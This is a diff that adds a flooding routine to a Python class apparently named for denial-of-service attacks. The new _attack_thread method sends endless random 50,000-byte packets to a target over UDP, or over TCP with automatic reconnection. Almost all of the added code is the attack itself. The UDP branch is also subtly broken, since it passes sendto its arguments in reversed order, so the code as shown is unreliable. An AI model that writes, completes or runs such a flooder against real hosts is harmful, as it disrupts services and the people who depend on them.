@@ -1,5 +1,6 @@
 import socket
 import time
+import secrets
 from threading import Thread
 
 
@@ -31,3 +32,24 @@ class DosPy(object):
         else:
             conn_check.close()
             return True
+
+    def _attack_thread(self) -> None:
+        if self._default_protocol == socket.SOCK_DGRAM:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            address = (self._host, self._port)
+
+            while True:
+                sock.sendto(address, secrets.token_bytes(50000))
+        elif self._default_protocol == socket.SOCK_STREAM:
+            address = (self._host, self._port)
+
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect(address)
+
+            while True:
+                try:
+                    sock.send(secrets.token_bytes(50000))
+                except OSError:
+                    sock.close()
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.connect(address)
